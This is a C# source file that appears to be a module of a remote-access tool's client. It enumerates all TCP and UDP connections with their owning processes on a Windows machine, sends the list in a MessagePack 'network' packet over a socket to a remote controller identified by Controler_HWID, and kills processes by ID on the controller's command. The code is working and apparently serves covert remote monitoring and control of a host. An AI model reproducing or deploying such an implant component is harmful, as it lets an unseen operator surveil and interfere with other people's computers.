using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using MessagePack;

namespace Client.HandlePacket
{
    internal class HandleNetwork
    {
        public static string GetIpAddress(long ipAddrs)
        {
            try
            {
                var ipAddress = new IPAddress(ipAddrs);
                return ipAddress.ToString();
            }
            catch
            {
                return ipAddrs.ToString();
            }
        }

        public static Native.UdpRow[] GetAllUdpConnections()
        {
            Native.UdpRow[] tTable;
            var AF_INET = 2; // IP_v4
            var buffSize = 0;
            var ret = Native.GetExtendedUdpTable(IntPtr.Zero, ref buffSize, true, AF_INET,
                Native.UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID);
            var buffTable = Marshal.AllocHGlobal(buffSize);
            try
            {
                ret = Native.GetExtendedUdpTable(buffTable, ref buffSize, true, AF_INET,
                    Native.UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID);
                if (ret != 0) return new Native.UdpRow[0];
                var tab = (Native.UdpTable) Marshal.PtrToStructure(buffTable, typeof(Native.UdpTable));
                var rowPtr = (IntPtr) ((long) buffTable + Marshal.SizeOf(tab.dwNumEntries));
                tTable = new Native.UdpRow[tab.dwNumEntries];

                for (var i = 0; i < tab.dwNumEntries; i++)
                {
                    var udpRow = (Native.UdpRow) Marshal.PtrToStructure(rowPtr, typeof(Native.UdpRow));
                    tTable[i] = udpRow;
                    rowPtr = (IntPtr) ((long) rowPtr + Marshal.SizeOf(udpRow)); // next entry
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }

            return tTable;
        }

        public static Native.MIB_TCPROW_OWNER_PID[] GetAllTcpConnections()
        {
            Native.MIB_TCPROW_OWNER_PID[] tcpConnectionRows;
            var AF_INET = 2; // IPv4
            var buffSize = 0;

            var ret = Native.GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, AF_INET,
                Native.TCP_TABLE_TYPE.TCP_TABLE_OWNER_PID_ALL, 0);
            if (ret != 0 && ret != 122)
                throw new Exception("Error occurred when trying to query tcp table, return code: " + ret);
            var buffTable = Marshal.AllocHGlobal(buffSize);

            try
            {
                ret = Native.GetExtendedTcpTable(buffTable, ref buffSize, true, AF_INET,
                    Native.TCP_TABLE_TYPE.TCP_TABLE_OWNER_PID_ALL, 0);
                if (ret != 0) throw new Exception("Error occurred when trying to query tcp table, return code: " + ret);

                var table = (Native.MIB_TCPTABLE_OWNER_PID) Marshal.PtrToStructure(buffTable,
                    typeof(Native.MIB_TCPTABLE_OWNER_PID));
                var rowPtr = (IntPtr) ((long) buffTable + Marshal.SizeOf(table.dwNumEntries));
                tcpConnectionRows = new Native.MIB_TCPROW_OWNER_PID[table.dwNumEntries];

                for (var i = 0; i < table.dwNumEntries; i++)
                {
                    var tcpRow =
                        (Native.MIB_TCPROW_OWNER_PID) Marshal.PtrToStructure(rowPtr,
                            typeof(Native.MIB_TCPROW_OWNER_PID));
                    tcpConnectionRows[i] = tcpRow;
                    rowPtr = (IntPtr) ((long) rowPtr + Marshal.SizeOf(tcpRow));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }

            return tcpConnectionRows;
        }

        public static void NetstatList(string Controler_HWID)
        {
            try
            {
                var sb = new StringBuilder();
                var tcpProgressInfoTable = GetAllTcpConnections();
                var udpRows = GetAllUdpConnections();

                var tableRowCount = tcpProgressInfoTable.Length;
                for (var i = 0; i < tableRowCount; i++)
                {
                    var row = tcpProgressInfoTable[i];
                    var source = $"{GetIpAddress(row.localAddr)}:{row.LocalPort}";
                    var dest = $"{GetIpAddress(row.remoteAddr)}:{row.RemotePort}";
                    sb.Append("TCP" + "-=>" + row.owningPid + "-=>" +
                              Process.GetProcessById(row.owningPid).ProcessName + "-=>" + source + "-=>" + dest +
                              "-=>" + (Native.TCP_CONNECTION_STATE) row.state + "-=>");
                }

                var tableRowCount2 = udpRows.Length;
                for (var i = 0; i < tableRowCount2; i++)
                {
                    var row = udpRows[i];
                    var source = $"{GetIpAddress(row.localAddr)}:{row.LocalPort}";
                    var dest = "*:*";
                    sb.Append("UDP" + "-=>" + row.owningPid + "-=>" +
                              Process.GetProcessById(row.owningPid).ProcessName + "-=>" + source + "-=>" + dest +
                              "-=>" + "" + "-=>");
                }

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "network";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("Message").AsString = sb.ToString();
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID, ex.Message);
            }
        }

        public static void Kill(string Controler_HWID, int ID)
        {
            foreach (var process in Process.GetProcesses())
                try
                {
                    if (process.Id == ID) process.Kill();
                }
                catch (Exception ex)
                {
                    Program.TCP_Socket.Log(Controler_HWID, ex.Message);
                }

            NetstatList(Controler_HWID);
        }
    }
}